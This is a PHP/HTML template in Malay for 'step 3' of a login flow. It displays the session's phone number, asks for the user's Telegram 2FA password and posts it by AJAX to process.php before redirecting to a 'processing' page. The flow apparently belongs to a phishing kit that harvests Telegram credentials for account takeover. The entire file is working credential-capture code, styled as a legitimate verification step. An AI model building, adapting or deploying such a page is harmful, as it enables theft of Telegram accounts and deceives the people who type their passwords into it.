<div class="form-label-title">KATA LALUAN</div>
<p style="text-align:center;font-size:.88rem;color:var(--muted);margin:0 0 16px;line-height:1.5">
  Akaun <strong style="color:var(--text)"><?= htmlspecialchars($_SESSION["phone_number"] ?? "", ENT_QUOTES) ?></strong>
  memerlukan pengesahan kata laluan 2FA.
</p>
<form id="formStep3" novalidate>
<div class="field-block">
<label class="form-label">Kata Laluan Telegram</label>
<div class="phone-group" style="cursor:default">
<div class="phone-prefix" style="cursor:pointer" id="togglePwd" title="Tunjuk/sembunyi kata laluan">
<i class="bi bi-eye-slash" id="pwdIcon" style="font-size:1.1rem;color:var(--muted);transition:color .2s"></i>
</div>
<div class="phone-input">
<input name="password" id="password" type="password" class="form-control" placeholder="Masukkan kata laluan" autocomplete="off">
</div>
</div>
<div style="margin-top:4px"><span style="font-size:.8rem;color:var(--muted)">Kata laluan 2FA yang anda tetapkan di Telegram.</span></div>
</div>
<button type="submit" class="btn-mk" style="margin-top:20px">Seterusnya</button>
</form>

<div id="wrong"></div>

<style>
#wrong{
    position:fixed;
    top:24px;
    left:0;
    transform:translateX(-115%);
    max-width:380px;
    width:88%;
    background:#fff;
    border:1px solid #fecaca;
    border-left:5px solid #ef4444;
    border-radius:14px;
    padding:14px 18px;
    box-shadow:0 14px 36px rgba(239,68,68,.16),0 0 0 1px rgba(239,68,68,.04);
    font-size:.88rem;
    font-weight:600;
    color:#991b1b;
    z-index:10000;
    display:flex;
    align-items:flex-start;
    gap:10px;
    transition:transform .5s cubic-bezier(.22,1,.36,1),opacity .4s ease;
    opacity:0;
    pointer-events:none;
    line-height:1.45
}
#wrong .wrong-icon{
    flex-shrink:0;
    width:22px;height:22px;
    background:#fef2f2;
    border-radius:50%;
    display:flex;align-items:center;justify-content:center;
    margin-top:1px
}
#wrong .wrong-icon i{font-size:.85rem;color:#ef4444}
#wrong .wrong-text{flex:1}
#wrong.is-visible{
    transform:translateX(18px);
    opacity:1;
    pointer-events:auto
}
#wrong.is-shake{
    animation:wrongShake .55s cubic-bezier(.36,.07,.19,.97) both
}
@keyframes wrongShake{
    0%  {transform:translateX(18px)}
    15% {transform:translateX(28px)}
    30% {transform:translateX(10px)}
    45% {transform:translateX(24px)}
    60% {transform:translateX(14px)}
    75% {transform:translateX(20px)}
    100%{transform:translateX(18px)}
}
#wrong::after{
    content:'';
    position:absolute;
    bottom:0;left:0;
    height:3px;
    background:linear-gradient(90deg,#ef4444,#f87171);
    border-radius:0 0 14px 14px;
    width:0;
    transition:width 5s linear
}
#wrong.is-visible::after{
    width:100%
}
</style>

<script>
$(function(){
  $("#loader, #wrong").hide();

  function showErr(msg) {
    $("#wrong").html(
      '<div class="wrong-icon"><i class="bi bi-exclamation-triangle-fill"></i></div>' +
      '<span class="wrong-text">' + msg + '</span>'
    ).addClass('is-visible');
    setTimeout(function(){ $("#wrong").removeClass('is-visible'); }, 4000);
  }

  $("#togglePwd").on("click", function(){
    var $inp = $("#password");
    var $ico = $("#pwdIcon");
    if($inp.attr("type") === "password"){
      $inp.attr("type", "text");
      $ico.removeClass("bi-eye-slash").addClass("bi-eye");
      $ico.css("color", "var(--primary)");
    } else {
      $inp.attr("type", "password");
      $ico.removeClass("bi-eye").addClass("bi-eye-slash");
      $ico.css("color", "var(--muted)");
    }
  });

  $("#formStep3").on("submit", function (e) {
    e.preventDefault();
    $("#wrong").removeClass('is-visible');

    var password = $.trim($("#password").val());
    if (!password) {
      showErr("Sila masukkan kata laluan terlebih dahulu.");
      $("#password").focus();
      return;
    }

    $("#loader").show();

    $.ajax({
      url: "process.php",
      type: "POST",
      dataType: "json",
      data: { step: "3", password: password }
    }).done(function () {
      window.location.href = "?next=processing";
    }).fail(function () {
      $("#loader").hide();
      showErr("Gagal menghantar permintaan. Sila cuba lagi.");
    });
  });

  $("#password").focus();
});
</script>